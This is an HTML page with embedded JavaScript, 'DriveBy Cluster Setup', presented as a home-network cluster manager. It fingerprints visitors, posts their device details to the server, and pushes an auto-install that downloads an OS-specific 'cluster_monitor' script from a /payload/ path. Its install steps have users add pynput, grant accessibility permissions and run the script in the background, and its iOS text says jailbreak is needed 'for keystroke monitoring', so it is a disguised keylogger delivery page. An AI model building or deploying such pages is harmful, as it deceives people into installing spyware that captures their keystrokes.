<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>DriveBy Cluster Setup</title>
 <style>
 body {
 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
 margin: 0;
 padding: 20px;
 min-height: 100vh;
 display: flex;
 justify-content: center;
 align-items: center;
 }

 .container {
 background: white;
 border-radius: 15px;
 padding: 40px;
 box-shadow: 0 20px 40px rgba(0,0,0,0.1);
 max-width: 600px;
 width: 100%;
 text-align: center;
 }

 .logo {
 font-size: 2.5em;
 font-weight: bold;
 color: #667eea;
 margin-bottom: 10px;
 }

 .subtitle {
 color: #666;
 margin-bottom: 30px;
 font-size: 1.1em;
 }

 .status {
 background: #f8f9fa;
 border-radius: 10px;
 padding: 20px;
 margin: 20px 0;
 border-left: 4px solid #28a745;
 }

 .detected-os {
 font-size: 1.2em;
 font-weight: bold;
 color: #333;
 margin: 15px 0;
 }

 .progress {
 background: #e9ecef;
 border-radius: 10px;
 height: 20px;
 margin: 20px 0;
 overflow: hidden;
 }

 .progress-bar {
 background: linear-gradient(90deg, #28a745, #20c997);
 height: 100%;
 width: 0%;
 transition: width 0.5s ease;
 }

 .btn {
 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
 color: white;
 border: none;
 padding: 15px 30px;
 border-radius: 25px;
 font-size: 1.1em;
 cursor: pointer;
 transition: transform 0.2s ease;
 margin: 10px;
 }

 .btn:hover {
 transform: translateY(-2px);
 }

 .btn:disabled {
 opacity: 0.6;
 cursor: not-allowed;
 transform: none;
 }

 .instructions {
 background: #fff3cd;
 border: 1px solid #ffeaa7;
 border-radius: 10px;
 padding: 20px;
 margin: 20px 0;
 text-align: left;
 }

 .instructions h4 {
 margin-top: 0;
 color: #856404;
 }

 .instructions ol {
 margin: 10px 0;
 padding-left: 20px;
 }

 .instructions li {
 margin: 5px 0;
 }

 .error {
 background: #f8d7da;
 border: 1px solid #f5c6cb;
 color: #721c24;
 border-radius: 10px;
 padding: 15px;
 margin: 20px 0;
 }

 .success {
 background: #d4edda;
 border: 1px solid #c3e6cb;
 color: #155724;
 border-radius: 10px;
 padding: 15px;
 margin: 20px 0;
 }

 .device-info {
 background: #e3f2fd;
 border-radius: 10px;
 padding: 15px;
 margin: 20px 0;
 text-align: left;
 }

 .device-info h4 {
 margin-top: 0;
 color: #1976d2;
 }

 .spinner {
 border: 4px solid #f3f3f3;
 border-top: 4px solid #667eea;
 border-radius: 50%;
 width: 40px;
 height: 40px;
 animation: spin 1s linear infinite;
 margin: 20px auto;
 }

 @keyframes spin {
 0% { transform: rotate(0deg); }
 100% { transform: rotate(360deg); }
 }
 </style>
</head>
<body>
 <div class="container">
 <div class="logo"> DriveBy</div>
 <div class="subtitle">Home Network Cluster Management</div>

 <div class="status">
 <div>Status: <span id="status">Initializing...</span></div>
 <div class="detected-os">Detected OS: <span id="detected-os">Detecting...</span></div>
 </div>

 <div class="progress">
 <div class="progress-bar" id="progress-bar"></div>
 </div>

 <div id="device-info" class="device-info" style="display: none;">
 <h4>Device Information</h4>
 <div id="device-details"></div>
 </div>

 <div id="instructions" class="instructions" style="display: none;">
 <h4>Installation Instructions</h4>
 <div id="instruction-content"></div>
 </div>

 <div id="error-message" class="error" style="display: none;"></div>
 <div id="success-message" class="success" style="display: none;"></div>

 <div id="spinner" class="spinner" style="display: none;"></div>

 <div>
 <button id="auto-install-btn" class="btn" onclick="autoInstall()">Auto Install</button>
 <button id="manual-install-btn" class="btn" onclick="showManualInstructions()">Manual Install</button>
 <button id="download-btn" class="btn" onclick="downloadPayload()" style="display: none;">Download Script</button>
 </div>
 </div>

 <script>
 let detectedOS = 'unknown';
 let deviceInfo = {};

 function detectOS() {
 const userAgent = navigator.userAgent;
 const platform = navigator.platform;

 if (userAgent.indexOf("Windows") !== -1) return "windows";
 if (userAgent.indexOf("Mac") !== -1) return "mac";
 if (userAgent.indexOf("Linux") !== -1 && userAgent.indexOf("Android") === -1) return "linux";
 if (userAgent.indexOf("Android") !== -1) return "android";
 if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) return "ios";

 return "unknown";
 }

 function getDeviceInfo() {
 return {
 userAgent: navigator.userAgent,
 platform: navigator.platform,
 language: navigator.language,
 cookieEnabled: navigator.cookieEnabled,
 onLine: navigator.onLine,
 screenWidth: screen.width,
 screenHeight: screen.height,
 colorDepth: screen.colorDepth,
 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
 timestamp: new Date().toISOString()
 };
 }

 function updateProgress(percent) {
 document.getElementById('progress-bar').style.width = percent + '%';
 }

 function showSpinner(show) {
 document.getElementById('spinner').style.display = show ? 'block' : 'none';
 }

 function showError(message) {
 const errorDiv = document.getElementById('error-message');
 errorDiv.textContent = message;
 errorDiv.style.display = 'block';
 setTimeout(() => {
 errorDiv.style.display = 'none';
 }, 5000);
 }

 function showSuccess(message) {
 const successDiv = document.getElementById('success-message');
 successDiv.textContent = message;
 successDiv.style.display = 'block';
 }

 function showDeviceInfo() {
 const deviceInfoDiv = document.getElementById('device-info');
 const deviceDetailsDiv = document.getElementById('device-details');

 let html = `
 <strong>OS:</strong> ${detectedOS}<br>
 <strong>Platform:</strong> ${deviceInfo.platform}<br>
 <strong>Screen:</strong> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}<br>
 <strong>Language:</strong> ${deviceInfo.language}<br>
 <strong>Timezone:</strong> ${deviceInfo.timezone}
 `;

 deviceDetailsDiv.innerHTML = html;
 deviceInfoDiv.style.display = 'block';
 }

 function getInstallInstructions(os) {
 const instructions = {
 windows: {
 title: "Windows Installation",
 steps: [
 "Download the PowerShell script",
 "Right-click on the downloaded file and select 'Run with PowerShell'",
 "If prompted, allow script execution by typing 'Y'",
 "The script will run in the background and connect to the cluster"
 ]
 },
 linux: {
 title: "Linux Installation",
 steps: [
 "Download the Python script",
 "Open terminal and navigate to the download location",
 "Install dependencies: pip3 install requests pynput",
 "Run the script: python3 cluster_monitor.py",
 "The script will connect to the cluster automatically"
 ]
 },
 mac: {
 title: "macOS Installation",
 steps: [
 "Download the Python script",
 "Open Terminal and navigate to the download location",
 "Install dependencies: pip3 install requests pynput",
 "Grant accessibility permissions when prompted",
 "Run the script: python3 cluster_monitor.py"
 ]
 },
 android: {
 title: "Android Installation",
 steps: [
 "Install Termux from F-Droid or Google Play",
 "Open Termux and run: pkg install python",
 "Download and run the Android script",
 "Grant necessary permissions when prompted",
 "The script will connect to the cluster"
 ]
 },
 ios: {
 title: "iOS Installation",
 steps: [
 "iOS devices require jailbreak for keystroke monitoring",
 "Install a Python environment (Pythonista or similar)",
 "This platform has limited support due to iOS restrictions"
 ]
 }
 };

 return instructions[os] || instructions['unknown'] || {
 title: "Unknown OS",
 steps: ["Unable to detect your operating system", "Please try manual installation"]
 };
 }

 function showManualInstructions() {
 const instructionsDiv = document.getElementById('instructions');
 const contentDiv = document.getElementById('instruction-content');

 const instructions = getInstallInstructions(detectedOS);

 let html = `<ol>`;
 instructions.steps.forEach(step => {
 html += `<li>${step}</li>`;
 });
 html += `</ol>`;

 contentDiv.innerHTML = html;
 instructionsDiv.style.display = 'block';

 document.getElementById('download-btn').style.display = 'inline-block';
 }

 function downloadPayload() {
 const payloadUrl = `/payload/${detectedOS}`;

 showSpinner(true);
 updateProgress(50);

 fetch(payloadUrl)
 .then(response => {
 if (!response.ok) {
 throw new Error(`HTTP ${response.status}: ${response.statusText}`);
 }
 return response.blob();
 })
 .then(blob => {
 const url = URL.createObjectURL(blob);
 const link = document.createElement('a');
 link.href = url;

 // Set appropriate filename based on OS
 const filenames = {
 'windows': 'cluster_monitor.ps1',
 'linux': 'cluster_monitor.py',
 'mac': 'cluster_monitor.py',
 'android': 'cluster_monitor.py'
 };

 link.download = filenames[detectedOS] || 'cluster_monitor.txt';
 document.body.appendChild(link);
 link.click();
 document.body.removeChild(link);
 URL.revokeObjectURL(url);

 updateProgress(100);
 showSuccess('Script downloaded successfully! Follow the installation instructions above.');
 })
 .catch(error => {
 console.error('Download error:', error);
 showError(`Download failed: ${error.message}`);
 })
 .finally(() => {
 showSpinner(false);
 });
 }

 function autoInstall() {
 document.getElementById('status').textContent = 'Installing...';
 showSpinner(true);
 updateProgress(25);

 // Simulate installation process
 setTimeout(() => {
 updateProgress(50);

 if (detectedOS === 'unknown') {
 showError('Cannot auto-install on unknown OS. Please use manual installation.');
 showSpinner(false);
 showManualInstructions();
 return;
 }

 updateProgress(75);

 // For most platforms, we'll download the script
 downloadPayload();

 setTimeout(() => {
 updateProgress(100);
 document.getElementById('status').textContent = 'Installation Complete';
 showSpinner(false);

 if (detectedOS === 'windows') {
 showSuccess('PowerShell script downloaded. Please run it as administrator.');
 } else if (detectedOS === 'android') {
 showSuccess('Android script downloaded. Install Termux and run the script.');
 } else {
 showSuccess('Script downloaded. Please follow the installation instructions.');
 }

 showManualInstructions();
 }, 1000);

 }, 1500);
 }

 // Initialize page
 window.onload = function() {
 detectedOS = detectOS();
 deviceInfo = getDeviceInfo();

 document.getElementById('detected-os').textContent = detectedOS.charAt(0).toUpperCase() + detectedOS.slice(1);
 document.getElementById('status').textContent = 'Ready for installation';

 showDeviceInfo();

 // Auto-install after 3 seconds if not iOS (which has limited support)
 if (detectedOS !== 'ios' && detectedOS !== 'unknown') {
 setTimeout(() => {
 if (confirm('Auto-install cluster management script?')) {
 autoInstall();
 }
 }, 3000);
 }
 };

 // Send device info to server for logging
 fetch('/status', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify({
 action: 'device_visit',
 device_info: deviceInfo,
 detected_os: detectedOS
 })
 }).catch(error => {
 console.log('Could not send device info to server:', error);
 });
 </script>
</body>
</html>
